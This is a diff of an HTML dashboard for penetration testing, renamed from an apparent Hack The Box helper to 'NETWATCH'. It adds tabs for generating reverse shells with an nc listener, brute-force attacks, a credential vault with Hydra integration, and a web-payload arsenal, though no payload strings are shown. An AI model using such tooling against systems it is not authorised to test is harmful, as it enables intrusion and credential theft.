@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>HTB DASHBOARD</title>
+<title>NETWATCH</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
@@ -20,7 +20,7 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 
 /* layout */
 #top{position:fixed;top:0;left:0;right:0;height:48px;z-index:20;
-  display:flex;align-items:center;padding:0 16px;gap:18px;
+  display:flex;align-items:center;padding:0 16px;gap:12px;
   background:var(--pan);border-bottom:1px solid var(--bdr);backdrop-filter:blur(14px)}
 #lp{position:fixed;top:56px;left:8px;bottom:62px;width:276px;z-index:20;
   background:var(--pan);border:1px solid var(--bdr);border-radius:4px;
@@ -32,9 +32,19 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
   background:var(--pan);border:1px solid var(--bdr);border-radius:4px;
   backdrop-filter:blur(14px);display:flex;align-items:center;padding:0 14px;gap:12px}
 
+/* scanning glow border on panels */
+#lp.scanning,#rp.scanning{border-color:rgba(0,255,136,.35);
+  box-shadow:0 0 18px rgba(0,255,136,.08)}
+
 /* topbar */
-.logo{color:var(--g);font-size:14px;letter-spacing:4px;text-shadow:0 0 16px var(--g);flex:1}
-.sb{display:flex;flex-direction:column;align-items:center;min-width:64px}
+.logo{color:var(--g);font-size:14px;letter-spacing:4px;text-shadow:0 0 16px var(--g)}
+#top-target{color:rgba(0,200,255,.65);font-size:10px;letter-spacing:2px;
+  border:1px solid rgba(0,200,255,.22);border-radius:20px;padding:3px 10px;
+  display:none;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#top-timer{color:rgba(0,255,136,.6);font-size:10px;letter-spacing:2px;
+  min-width:52px;display:none}
+.topflex{flex:1}
+.sb{display:flex;flex-direction:column;align-items:center;min-width:58px}
 .sl{color:rgba(0,200,255,.5);font-size:9px;letter-spacing:2px;text-transform:uppercase}
 .sv{color:var(--c);font-size:13px;text-shadow:0 0 8px var(--c)}
 .pill{display:flex;align-items:center;gap:6px;padding:4px 10px;
@@ -48,7 +58,7 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 
 /* panel tabs */
 .ptabs{display:flex;border-bottom:1px solid var(--bdr);flex-shrink:0}
-.ptab{flex:1;padding:8px;font-family:var(--font);font-size:10px;letter-spacing:2px;
+.ptab{flex:1;padding:8px 2px;font-family:var(--font);font-size:9px;letter-spacing:1px;
   text-transform:uppercase;background:transparent;border:none;
   color:rgba(0,200,255,.4);cursor:pointer;transition:all .15s;border-bottom:2px solid transparent}
 .ptab.active{color:var(--c);border-bottom-color:var(--c)}
@@ -66,10 +76,11 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
   background:rgba(0,20,50,.75);border:1px solid rgba(0,150,255,.22);border-radius:2px;
   color:var(--g);font-family:var(--font);font-size:12px;padding:6px 9px;
   width:100%;outline:none;transition:border-color .2s;resize:vertical}
-.fld input:focus,.fld textarea:focus{border-color:rgba(0,255,136,.5);box-shadow:0 0 8px rgba(0,255,136,.08)}
+.fld input:focus,.fld textarea:focus,.fld select:focus{border-color:rgba(0,255,136,.5);box-shadow:0 0 8px rgba(0,255,136,.08)}
 .fld select option{background:#0a1020}
-.fld textarea{min-height:75px;line-height:1.5}
+.fld textarea{min-height:70px;line-height:1.5}
 .r2{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+.r3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px}
 
 /* section label */
 .sec{color:rgba(0,200,255,.4);font-size:9px;letter-spacing:3px;text-transform:uppercase;
@@ -102,6 +113,8 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 .btn-go:hover:not(:disabled){background:var(--g);color:#000;box-shadow:0 0 18px var(--g)}
 .btn-stp{border-color:var(--r);color:var(--r)}
 .btn-stp:hover:not(:disabled){background:var(--r);color:#fff;box-shadow:0 0 18px var(--r)}
+.btn-c{border-color:var(--c);color:var(--c)}
+.btn-c:hover:not(:disabled){background:rgba(0,200,255,.1);box-shadow:0 0 12px rgba(0,200,255,.3)}
 .btn:disabled{opacity:.3;cursor:not-allowed}
 
 /* hint */
@@ -125,15 +138,24 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 #find-body::-webkit-scrollbar-thumb{background:rgba(0,180,255,.25);border-radius:2px}
 .find-sect{color:var(--c);font-size:9px;letter-spacing:3px;text-transform:uppercase;
   padding:4px 0 2px;border-bottom:1px solid rgba(0,200,255,.15);margin-top:4px}
-.port-row{display:grid;grid-template-columns:52px 80px 1fr auto;gap:6px;align-items:center;
-  padding:5px 6px;background:rgba(0,20,50,.5);border:1px solid rgba(0,180,255,.12);border-radius:2px}
+.port-wrap{background:rgba(0,20,50,.5);border:1px solid rgba(0,180,255,.12);border-radius:2px}
+.port-row{display:grid;grid-template-columns:44px 68px 1fr auto auto;gap:5px;align-items:center;
+  padding:5px 6px}
 .port-num{color:var(--a);font-size:13px;letter-spacing:1px}
 .port-svc{color:var(--c);font-size:11px}
 .port-ban{color:rgba(160,216,200,.6);font-size:10px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.atk-btn{padding:3px 8px;font-family:var(--font);font-size:9px;letter-spacing:1px;
+.atk-btn{padding:3px 7px;font-family:var(--font);font-size:9px;letter-spacing:1px;
   border:1px solid rgba(0,255,136,.4);border-radius:2px;background:transparent;
   color:rgba(0,255,136,.7);cursor:pointer;white-space:nowrap;transition:all .15s}
 .atk-btn:hover{background:var(--g);color:#000;border-color:var(--g)}
+.cmd-btn{padding:3px 6px;font-family:var(--font);font-size:9px;
+  border:1px solid rgba(0,200,255,.3);border-radius:2px;background:transparent;
+  color:rgba(0,200,255,.6);cursor:pointer;transition:all .15s;white-space:nowrap}
+.cmd-btn:hover{background:rgba(0,200,255,.1);color:var(--c);border-color:var(--c)}
+.cve-row{margin:0 6px 5px;padding:5px 7px;background:rgba(40,20,0,.6);
+  border:1px solid rgba(255,170,0,.3);border-radius:2px}
+.cve-id{color:var(--a);font-size:9px;letter-spacing:1px}
+.cve-detail{color:rgba(255,220,100,.7);font-size:9px;margin-top:2px;line-height:1.4;word-break:break-all}
 .http-card{background:rgba(0,15,40,.6);border:1px solid rgba(0,180,255,.15);border-radius:3px;padding:7px 9px}
 .http-url{color:var(--g);font-size:11px;margin-bottom:4px}
 .http-meta{color:rgba(160,216,200,.55);font-size:10px;margin-bottom:4px}
@@ -159,11 +181,93 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
   border:1px solid var(--g);border-radius:3px;color:var(--g);font-size:13px;
   text-shadow:0 0 8px var(--g);max-width:480px;word-break:break-all}
 
+/* shell cards */
+.shell-card{background:rgba(0,20,50,.5);border:1px solid rgba(0,180,255,.12);border-radius:2px;padding:6px 8px}
+.shell-label{color:var(--a);font-size:9px;letter-spacing:2px;margin-bottom:4px;
+  display:flex;justify-content:space-between;align-items:center}
+.shell-cmd{color:var(--g);font-size:9px;word-break:break-all;line-height:1.5}
+.copy-btn{background:none;border:1px solid rgba(0,255,136,.35);border-radius:2px;
+  padding:2px 7px;font-family:var(--font);font-size:9px;color:rgba(0,255,136,.7);
+  cursor:pointer;letter-spacing:1px;transition:all .15s;flex-shrink:0}
+.copy-btn:hover{background:rgba(0,255,136,.1);border-color:var(--g);color:var(--g)}
+.tty-card{background:rgba(0,10,30,.5);border:1px solid rgba(0,180,255,.08);border-radius:2px;
+  padding:5px 8px;display:flex;align-items:center;gap:6px}
+.tty-cmd{color:rgba(160,216,200,.7);font-size:9px;word-break:break-all;line-height:1.4;flex:1}
+.listen-btn{padding:3px 8px;font-family:var(--font);font-size:9px;letter-spacing:1px;
+  border:1px solid rgba(187,102,255,.5);border-radius:2px;background:transparent;
+  color:rgba(187,102,255,.8);cursor:pointer;transition:all .15s;width:100%;margin-top:4px}
+.listen-btn:hover:not(:disabled){background:rgba(187,102,255,.15);color:var(--p)}
+.listen-btn:disabled{opacity:.3;cursor:not-allowed}
+
+/* tools tab */
+.enc-out{background:rgba(0,20,50,.75);border:1px solid rgba(0,150,255,.22);border-radius:2px;
+  color:rgba(160,216,200,.8);font-family:var(--font);font-size:11px;padding:6px 9px;
+  width:100%;min-height:70px;line-height:1.5;resize:vertical;outline:none}
+.hash-match{background:rgba(0,20,50,.5);border:1px solid rgba(0,180,255,.15);border-radius:2px;padding:7px 9px;margin-top:4px}
+.hash-name{color:var(--a);font-size:11px;margin-bottom:3px}
+.hash-modes{display:flex;gap:10px;margin-bottom:3px}
+.hash-hc{color:rgba(160,216,200,.6);font-size:9px}
+.hash-hc span{color:var(--g)}
+.hash-john{color:rgba(160,216,200,.6);font-size:9px}
+.hash-john span{color:var(--c)}
+.hash-cmd{color:rgba(160,216,200,.45);font-size:9px;word-break:break-all}
+
+/* notes */
+#notes{flex:1;background:transparent;border:none;color:#a0d8c8;
+  font-family:var(--font);font-size:11px;padding:8px 12px;
+  resize:none;line-height:1.7;outline:none}
+#notes::placeholder{color:rgba(0,200,255,.2)}
+
 /* animations */
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
 @keyframes pop{from{opacity:0;transform:translate(-50%,-50%) scale(.5)}to{opacity:1;transform:translate(-50%,-50%) scale(1)}}
 @keyframes flash{0%,100%{opacity:1}50%{opacity:.1}}
 .pfl{animation:flash .3s ease-in-out 6}
+
+/* chip active state (for payload categories) */
+.chip.active{border-color:var(--c);color:var(--c);background:rgba(0,200,255,.07)}
+
+/* repeater history pills */
+.rep-pill{padding:3px 9px;font-family:var(--font);font-size:9px;
+  border:1px solid rgba(0,180,255,.18);border-radius:20px;background:transparent;
+  cursor:pointer;transition:all .15s;display:flex;gap:6px;align-items:center}
+.rep-pill:hover{border-color:var(--c);background:rgba(0,200,255,.06)}
+.rep-pill-url{color:rgba(160,216,200,.45);font-size:9px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:150px}
+
+/* response viewer */
+.resp-hdr-row{display:flex;gap:6px;font-size:9px;padding:1px 0;line-height:1.4}
+.resp-hdr-k{color:rgba(0,200,255,.5);min-width:130px;flex-shrink:0}
+.resp-hdr-v{color:rgba(160,216,200,.45);word-break:break-all}
+
+/* payload arsenal */
+.pay-card{background:rgba(0,20,50,.45);border:1px solid rgba(0,180,255,.1);
+  border-radius:2px;padding:4px 7px;display:flex;gap:6px;align-items:flex-start}
+.pay-label{color:var(--a);font-size:9px;letter-spacing:.5px;min-width:88px;flex-shrink:0;padding-top:2px;line-height:1.3}
+.pay-text{color:rgba(160,216,200,.65);font-size:9px;word-break:break-all;flex:1;line-height:1.45}
+.pay-actions{display:flex;gap:3px;flex-shrink:0;margin-top:1px}
+.pay-copy,.pay-atk{padding:2px 6px;font-family:var(--font);font-size:9px;
+  border-radius:2px;cursor:pointer;transition:all .15s;border:1px solid;background:transparent}
+.pay-copy{border-color:rgba(0,255,136,.3);color:rgba(0,255,136,.6)}
+.pay-copy:hover{background:rgba(0,255,136,.1);border-color:var(--g);color:var(--g)}
+.pay-atk{border-color:rgba(0,200,255,.25);color:rgba(0,200,255,.5)}
+.pay-atk:hover{background:rgba(0,200,255,.1);border-color:var(--c);color:var(--c)}
+
+/* cred vault */
+.cv-row{background:rgba(0,20,50,.45);border:1px solid rgba(0,180,255,.1);
+  border-radius:2px;padding:5px 7px;display:flex;gap:5px;align-items:center;flex-wrap:wrap}
+.cv-user{color:var(--g);font-size:11px;min-width:60px;max-width:70px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cv-pass{color:var(--a);font-size:11px;min-width:60px;max-width:70px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cv-svc{color:var(--c);font-size:9px;min-width:36px}
+.cv-host{color:rgba(160,216,200,.45);font-size:9px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}
+.cv-act{display:flex;gap:3px;flex-shrink:0}
+.cv-btn{padding:2px 6px;font-family:var(--font);font-size:9px;
+  border-radius:2px;cursor:pointer;transition:all .15s;border:1px solid;background:transparent}
+.cv-copy{border-color:rgba(0,255,136,.3);color:rgba(0,255,136,.5)}
+.cv-copy:hover{background:rgba(0,255,136,.08);color:var(--g);border-color:var(--g)}
+.cv-hydra{border-color:rgba(187,102,255,.3);color:rgba(187,102,255,.5)}
+.cv-hydra:hover{background:rgba(187,102,255,.08);color:var(--p);border-color:var(--p)}
+.cv-del{border-color:rgba(255,51,85,.2);color:rgba(255,51,85,.4)}
+.cv-del:hover{background:rgba(255,51,85,.08);color:var(--r);border-color:var(--r)}
 </style>
 </head>
 <body>
@@ -171,7 +275,10 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 
 <!-- TOP BAR -->
 <div id="top">
-  <span class="logo">◉ HTB DASHBOARD</span>
+  <span class="logo">◉ NETWATCH</span>
+  <span id="top-target"></span>
+  <span id="top-timer"></span>
+  <div class="topflex"></div>
   <div class="pill"><span class="dot idle" id="sd"></span><span id="st">IDLE</span></div>
   <div class="sb"><span class="sl">Tried</span><span class="sv" id="s-c">0</span></div>
   <div class="sb"><span class="sl">Rate</span><span class="sv" id="s-r">0/s</span></div>
@@ -183,15 +290,18 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 <!-- LEFT PANEL -->
 <div id="lp">
   <div class="ptabs">
-    <button class="ptab active" id="lt-scan" onclick="showLeft('scan')">Recon</button>
-    <button class="ptab"        id="lt-atk"  onclick="showLeft('atk')">Attack</button>
+    <button class="ptab active" id="lt-scan"  onclick="showLeft('scan')">Recon</button>
+    <button class="ptab"        id="lt-atk"   onclick="showLeft('atk')">Attack</button>
+    <button class="ptab"        id="lt-sh"    onclick="showLeft('sh')">Shells</button>
+    <button class="ptab"        id="lt-rep"   onclick="showLeft('rep')">Repeat</button>
+    <button class="ptab"        id="lt-creds" onclick="showLeft('creds')">Creds</button>
   </div>
 
   <!-- RECON TAB -->
   <div id="ls-scan" class="pbody">
     <div class="sec">Target</div>
     <div class="fld"><label>IP / Hostname</label>
-      <input id="s-host" placeholder="10.10.11.x or target.htb">
+      <input id="s-host" placeholder="192.168.x.x or target.local">
     </div>
     <div class="sec">Port Scope</div>
     <div class="tabs">
@@ -201,12 +311,12 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
     </div>
     <div id="s-range" style="display:none">
       <div class="r2" style="margin-top:6px">
-        <div class="fld"><label>From</label><input id="s-p1" type="number" value="1" min="1" max="65535"></div>
+        <div class="fld"><label>From</label><input id="s-p1" type="number" value="1"     min="1" max="65535"></div>
         <div class="fld"><label>To</label>  <input id="s-p2" type="number" value="10000" min="1" max="65535"></div>
       </div>
     </div>
     <div class="fld"><label>Threads</label><input id="s-threads" type="number" value="150" min="10" max="300"></div>
-    <div class="hint">Scans open ports → grabs banners → auto-probes HTTP services</div>
+    <div class="hint">Scans open ports → banners → HTTP probe → CVE hints</div>
     <button class="btn btn-go"  id="btn-scan" onclick="launchScan()">▶ Scan Target</button>
     <button class="btn btn-stp" id="btn-sstp" onclick="stopScan()" disabled>■ Stop</button>
   </div>
@@ -224,7 +334,7 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
     </div>
     <div id="as-num">
       <div class="r2" style="margin-top:6px">
-        <div class="fld"><label>Start</label><input id="a-start" type="number" value="0" min="0" max="9999"></div>
+        <div class="fld"><label>Start</label><input id="a-start" type="number" value="0"    min="0" max="9999"></div>
         <div class="fld"><label>End</label>  <input id="a-end"   type="number" value="9999" min="0" max="9999"></div>
       </div>
     </div>
@@ -260,35 +370,233 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
     </details>
     <div class="sec">Detection</div>
     <div class="r2">
-      <div class="fld"><label>JSON Key</label><input id="a-key"  placeholder="flag"></div>
+      <div class="fld"><label>JSON Key</label><input id="a-key"  placeholder="token"></div>
       <div class="fld"><label>Status</label>  <input id="a-code" placeholder="200"></div>
     </div>
-    <div class="fld"><label>Body Contains</label><input id="a-text" placeholder="HTB{"></div>
+    <div class="fld"><label>Body Contains</label><input id="a-text" placeholder="success"></div>
     <div class="fld"><label>Fail Contains</label> <input id="a-fail" placeholder="invalid"></div>
     <div class="fld"><label>Threads</label><input id="a-threads" type="number" value="10" min="1" max="50"></div>
-    <button class="btn btn-go"  id="btn-atk" onclick="launchAttack()">▶ Launch</button>
+    <button class="btn btn-go"  id="btn-atk"  onclick="launchAttack()">▶ Launch</button>
     <button class="btn btn-stp" id="btn-astp" onclick="stopAttack()" disabled>■ Stop</button>
+  </div>
+
+  <!-- SHELLS TAB -->
+  <div id="ls-sh" class="pbody" style="display:none">
+    <div class="sec">Listener Config</div>
+    <div class="r2">
+      <div class="fld">
+        <label>LHOST <span id="ip-hint" style="color:rgba(0,255,136,.4);font-size:9px"></span></label>
+        <input id="sh-ip" placeholder="10.0.0.1">
+      </div>
+      <div class="fld"><label>LPORT</label>
+        <input id="sh-port" type="number" value="4444" min="1" max="65535">
+      </div>
+    </div>
+    <div class="r2">
+      <button class="btn btn-go"  onclick="generateShells()" style="font-size:9px;letter-spacing:2px">⚡ Generate</button>
+      <button class="listen-btn"  id="btn-lst" onclick="startListener()">▶ nc Listen</button>
+    </div>
+    <button class="btn btn-stp" id="btn-lstp" onclick="stopListener()" disabled style="font-size:9px;letter-spacing:2px">■ Kill Listener</button>
+    <div class="sec">Payloads</div>
+    <div id="sh-list">
+      <div style="color:rgba(0,200,255,.3);font-size:11px;text-align:center;margin-top:8px">
+        Hit Generate to build payloads
+      </div>
+    </div>
+    <div class="sec" style="margin-top:2px">TTY Upgrade</div>
+    <div id="tty-list"></div>
+  </div>
+
+  <!-- REPEAT TAB -->
+  <div id="ls-rep" class="pbody" style="display:none">
+    <div class="sec">Request</div>
+    <div class="r2">
+      <div class="fld"><label>Method</label>
+        <select id="rep-method" onchange="updateRepBody()">
+          <option value="GET">GET</option>
+          <option value="POST">POST</option>
+          <option value="PUT">PUT</option>
+          <option value="DELETE">DELETE</option>
+          <option value="PATCH">PATCH</option>
+          <option value="HEAD">HEAD</option>
+          <option value="OPTIONS">OPTIONS</option>
+        </select>
+      </div>
+      <div class="fld">
+        <label>Redirects</label>
+        <div class="tabs" style="margin-top:3px">
+          <button class="tab active" id="rep-fw-on"  onclick="setRepFollow(true)">Follow</button>
+          <button class="tab"        id="rep-fw-off" onclick="setRepFollow(false)">Stop</button>
+        </div>
+      </div>
+    </div>
+    <div class="fld"><label>URL</label>
+      <input id="rep-url" placeholder="http://target:80/api/endpoint">
+    </div>
+    <details style="margin-top:2px">
+      <summary style="color:rgba(0,200,255,.45);font-size:9px;letter-spacing:2px;cursor:pointer;padding:4px 0">HEADERS</summary>
+      <div class="fld" style="margin-top:5px">
+        <textarea id="rep-hdrs" style="min-height:48px" placeholder="Content-Type: application/json&#10;Authorization: Bearer token&#10;Cookie: session=abc"></textarea>
+      </div>
+    </details>
+    <div id="rep-body-wrap" style="display:none">
+      <div class="fld"><label>Body</label>
+        <textarea id="rep-body" style="min-height:64px" placeholder='{"key": "value"}'></textarea>
+      </div>
+    </div>
+    <button class="btn btn-go" id="btn-rep" onclick="sendRepeater()">▶ Send</button>
+    <div class="sec">History <span id="rep-hist-count" style="color:rgba(0,255,136,.4)"></span></div>
+    <div id="rep-hist" style="display:flex;flex-direction:column;gap:3px"></div>
+  </div>
+
+  <!-- CREDS VAULT TAB -->
+  <div id="ls-creds" class="pbody" style="display:none">
+    <div class="sec">Add Credential</div>
+    <div class="r2">
+      <div class="fld"><label>Username</label><input id="cv-user" placeholder="admin"></div>
+      <div class="fld"><label>Password</label><input id="cv-pass" placeholder="hunter2"></div>
+    </div>
+    <div class="r2">
+      <div class="fld"><label>Service</label>
+        <select id="cv-svc">
+          <option>SSH</option><option>FTP</option><option>HTTP</option>
+          <option>SMB</option><option>RDP</option><option>MySQL</option>
+          <option>PostgreSQL</option><option>MSSQL</option><option>Redis</option>
+          <option>MongoDB</option><option>Other</option>
+        </select>
+      </div>
+      <div class="fld"><label>Host:Port</label><input id="cv-host" placeholder="10.0.0.1:22"></div>
+    </div>
+    <div class="fld"><label>Note</label><input id="cv-note" placeholder="from /etc/passwd, valid for sudo"></div>
+    <button class="btn btn-go" onclick="addCred()" style="font-size:10px;letter-spacing:2px">+ Add to Vault</button>
+    <div class="sec">Vault <span id="cv-count" style="color:rgba(0,255,136,.4)"></span></div>
+    <div id="cv-list"></div>
+    <div class="r2" style="margin-top:4px">
+      <button onclick="exportCreds()" class="btn btn-c"   style="font-size:9px;letter-spacing:1px;padding:5px">⬇ Export JSON</button>
+      <button onclick="clearCreds()"  class="btn btn-stp" style="font-size:9px;letter-spacing:1px;padding:5px">✕ Clear Vault</button>
+    </div>
   </div>
 </div>
 
 <!-- RIGHT PANEL -->
 <div id="rp">
   <div class="ptabs">
-    <button class="ptab active" id="rt-find" onclick="showRight('find')">Findings</button>
+    <button class="ptab active" id="rt-find" onclick="showRight('find')">Find</button>
     <button class="ptab"        id="rt-log"  onclick="showRight('log')">Log</button>
+    <button class="ptab"        id="rt-resp" onclick="showRight('resp')">Resp</button>
+    <button class="ptab"        id="rt-tool" onclick="showRight('tool')">Tools</button>
+    <button class="ptab"        id="rt-note" onclick="showRight('note')">Notes</button>
   </div>
+
+  <!-- FINDINGS -->
   <div id="rs-find" style="display:flex;flex-direction:column;flex:1;overflow:hidden">
-    <div id="find-body">
+    <div style="display:flex;justify-content:flex-end;padding:4px 10px;flex-shrink:0;gap:6px">
+      <button onclick="exportFindings()" style="background:none;border:1px solid rgba(0,200,255,.25);border-radius:2px;color:rgba(0,200,255,.5);cursor:pointer;font-family:var(--font);font-size:9px;letter-spacing:1px;padding:2px 8px">⬇ Export MD</button>
+      <button onclick="clearFindings()" style="background:none;border:none;color:rgba(0,200,255,.35);cursor:pointer;font-family:var(--font);font-size:9px;letter-spacing:1px">CLEAR</button>
+    </div>
+    <div id="find-body" style="flex:1;overflow-y:auto;padding:0 10px 8px">
       <div style="color:rgba(0,200,255,.3);font-size:11px;text-align:center;margin-top:30px">
         Run a recon scan to populate findings
       </div>
     </div>
   </div>
+
+  <!-- LOG -->
   <div id="rs-log" style="display:none;flex-direction:column;flex:1;overflow:hidden">
     <div style="display:flex;justify-content:flex-end;padding:4px 10px;flex-shrink:0">
       <button onclick="clearLog()" style="background:none;border:none;color:rgba(0,200,255,.35);cursor:pointer;font-family:var(--font);font-size:9px;letter-spacing:1px">CLEAR</button>
     </div>
     <div id="log-body"></div>
+  </div>
+
+  <!-- RESPONSE VIEWER -->
+  <div id="rs-resp" style="display:none;flex-direction:column;flex:1;overflow:hidden">
+    <div style="flex-shrink:0;padding:5px 10px;border-bottom:1px solid var(--bdr);display:flex;gap:8px;align-items:center">
+      <span id="resp-badge" style="font-size:13px;letter-spacing:2px;color:rgba(160,216,200,.3)">—</span>
+      <span id="resp-reason" style="font-size:9px;color:rgba(160,216,200,.35)"></span>
+      <span id="resp-ms"   style="font-size:9px;color:rgba(0,200,255,.45)"></span>
+      <span id="resp-size" style="font-size:9px;color:rgba(0,200,255,.35)"></span>
+      <div style="flex:1"></div>
+      <button onclick="copyResp()" style="background:none;border:1px solid rgba(0,200,255,.22);border-radius:2px;color:rgba(0,200,255,.5);cursor:pointer;font-family:var(--font);font-size:9px;letter-spacing:1px;padding:2px 8px">⎘ Body</button>
+    </div>
+    <div id="resp-hdrs" style="flex-shrink:0;max-height:80px;overflow-y:auto;padding:4px 10px 3px;border-bottom:1px solid rgba(0,180,255,.07)"></div>
+    <div id="resp-body" style="flex:1;overflow-y:auto;padding:6px 10px;font-size:10px;font-family:var(--font);color:#a0d8c8;white-space:pre-wrap;line-height:1.5;word-break:break-all"></div>
+  </div>
+
+  <!-- TOOLS -->
+  <div id="rs-tool" style="display:none;flex-direction:column;flex:1;overflow:hidden">
+    <div class="pbody">
+      <!-- Encoder/Decoder -->
+      <div class="sec">Encoder / Decoder</div>
+      <div class="fld">
+        <label>Input</label>
+        <textarea id="enc-in" style="min-height:58px" placeholder="Paste text, hash, token..."></textarea>
+      </div>
+      <div class="r2">
+        <div class="fld"><label>Type</label>
+          <select id="enc-type">
+            <option value="base64">Base64</option>
+            <option value="base64url">Base64 URL-safe</option>
+            <option value="hex">Hex</option>
+            <option value="url">URL encode</option>
+            <option value="rot13">ROT13</option>
+            <option value="html">HTML entities</option>
+            <option value="jwt">JWT decode</option>
+          </select>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:4px;justify-content:flex-end">
+          <button class="btn btn-go"  onclick="doEncode()" style="font-size:9px;letter-spacing:1px;padding:5px">▶ Encode</button>
+          <button class="btn btn-c"   onclick="doDecode()" style="font-size:9px;letter-spacing:1px;padding:5px">▼ Decode</button>
+        </div>
+      </div>
+      <div class="chips">
+        <button class="chip" onclick="swapEnc()">↩ Swap</button>
+        <button class="chip" onclick="copyEncOut()">⎘ Copy</button>
+        <button class="chip" onclick="document.getElementById('enc-in').value='';document.getElementById('enc-out').value=''">✕ Clear</button>
+      </div>
+      <div class="fld">
+        <label>Output</label>
+        <textarea id="enc-out" class="enc-out" readonly></textarea>
+      </div>
+
+      <!-- Hash Identifier -->
+      <div class="sec">Hash Identifier</div>
+      <div class="fld">
+        <label>Hash</label>
+        <input id="hash-in" placeholder="5f4dcc3b5aa765d61d8327deb882cf99"
+               oninput="identifyHashLive(this.value)">
+      </div>
+      <div id="hash-out"></div>
+
+      <!-- Payload Arsenal -->
+      <div class="sec" style="margin-top:6px">Payload Arsenal</div>
+      <div class="chips" id="pay-cats">
+        <button class="chip active" onclick="selectPayCat(this,'SQLi')">SQLi</button>
+        <button class="chip"        onclick="selectPayCat(this,'XSS')">XSS</button>
+        <button class="chip"        onclick="selectPayCat(this,'SSTI')">SSTI</button>
+        <button class="chip"        onclick="selectPayCat(this,'LFI')">LFI</button>
+        <button class="chip"        onclick="selectPayCat(this,'CMDi')">CMDi</button>
+        <button class="chip"        onclick="selectPayCat(this,'XXE')">XXE</button>
+        <button class="chip"        onclick="selectPayCat(this,'SSRF')">SSRF</button>
+        <button class="chip"        onclick="selectPayCat(this,'NoSQL')">NoSQL</button>
+      </div>
+      <div class="fld">
+        <input id="pay-search" placeholder="Filter payloads..." oninput="renderPayloads()">
+      </div>
+      <div id="pay-list" style="display:flex;flex-direction:column;gap:3px"></div>
+    </div>
+  </div>
+
+  <!-- NOTES -->
+  <div id="rs-note" style="display:none;flex-direction:column;flex:1;overflow:hidden">
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:4px 10px;flex-shrink:0">
+      <span style="color:rgba(0,200,255,.4);font-size:9px;letter-spacing:2px" id="note-saved">AUTO-SAVED</span>
+      <div style="display:flex;gap:8px">
+        <button onclick="copyNotes()" style="background:none;border:none;color:rgba(0,200,255,.35);cursor:pointer;font-family:var(--font);font-size:9px;letter-spacing:1px">⎘ COPY</button>
+        <button onclick="clearNotes()" style="background:none;border:none;color:rgba(255,51,85,.4);cursor:pointer;font-family:var(--font);font-size:9px;letter-spacing:1px">CLEAR</button>
+      </div>
+    </div>
+    <textarea id="notes" placeholder="Target: &#10;Ports: &#10;Creds: &#10;Flags: &#10;Notes: "></textarea>
   </div>
 </div>
 
@@ -307,469 +615,1455 @@ body{background:var(--bg);color:#a0d8c8;font-family:var(--font);font-size:12px;o
 // THREE.JS GLOBE
 // ═══════════════════════════════════════════════════════════
 (function(){
-  const canvas=document.getElementById('gc');
-  const W=()=>window.innerWidth,H=()=>window.innerHeight;
-  const renderer=new THREE.WebGLRenderer({canvas,antialias:true,alpha:true});
-  renderer.setPixelRatio(Math.min(devicePixelRatio,2));
-  renderer.setSize(W(),H());
-  const scene=new THREE.Scene();
-  const cam=new THREE.PerspectiveCamera(45,W()/H(),.1,500);
-  cam.position.set(0,0,2.6);
-  cam.lookAt(0,0,0);
+  const canvas = document.getElementById('gc');
+  const W = () => window.innerWidth;
+  const H = () => window.innerHeight;
+
+  const renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: true });
+  renderer.setPixelRatio(Math.min(devicePixelRatio, 2));
+  renderer.setSize(W(), H());
+
+  const scene = new THREE.Scene();
+  const cam   = new THREE.PerspectiveCamera(60, W() / H(), 0.1, 1000);
+  cam.position.set(0, 0, 3.0);
 
   // Stars
-  const sb=new Float32Array(6000*3);
-  for(let i=0;i<sb.length;i++)sb[i]=(Math.random()-.5)*400;
-  const sg=new THREE.BufferGeometry();
-  sg.setAttribute('position',new THREE.BufferAttribute(sb,3));
-  scene.add(new THREE.Points(sg,new THREE.PointsMaterial({color:0xffffff,size:.08,transparent:true,opacity:.7})));
+  const starPos = new Float32Array(8000 * 3);
+  for (let i = 0; i < starPos.length; i++) starPos[i] = (Math.random() - 0.5) * 600;
+  const starGeo = new THREE.BufferGeometry();
+  starGeo.setAttribute('position', new THREE.BufferAttribute(starPos, 3));
+  const starMat = new THREE.PointsMaterial({ color: 0xffffff, size: 0.12, transparent: true, opacity: 0.75 });
+  scene.add(new THREE.Points(starGeo, starMat));
 
-  const pivot=new THREE.Group(); scene.add(pivot);
+  // Globe group
+  const pivot = new THREE.Group();
+  scene.add(pivot);
+  pivot.position.x = -0.05;
 
-  // Centre pivot in the visible gap between left (284px) and right (318px) panels
-  function centerPivot(){
-    const lp=284,rp=318,ww=W(),hh=H();
